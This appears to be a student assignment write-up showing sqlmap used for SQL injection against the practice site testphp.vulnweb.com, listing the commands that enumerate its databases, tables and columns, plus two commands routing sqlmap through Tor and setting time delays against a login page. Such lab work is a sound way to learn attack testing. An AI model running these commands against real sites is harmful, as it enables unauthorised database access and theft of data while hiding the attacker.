Assignment 1
•	I have used sqlmap for conducting the attack on the website. 
•	the command that I have used in this attack  using sql map with the link followed and –dbs for their database entry 

sqlmap -u testphp.vulnweb.com/artists.php?artist=1 –dbs

•	After this command entry the system showed two available databases
1.	acuart
2.	information_schema 

•	so we used acuart. byt typing the command,

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –tables

•	the –tables was used to get the table of acuart. so we got the table and the screenshot is in the other file. 

•	now I used the command

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T products –columns 

in this command products is the table content and we have asked for the products that are in the database of acuart.

sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5	

sqlmap -u "http://testsite.com/login.php" --time-sec 15


•	In this way we can inject the website and get the database on the terminal.
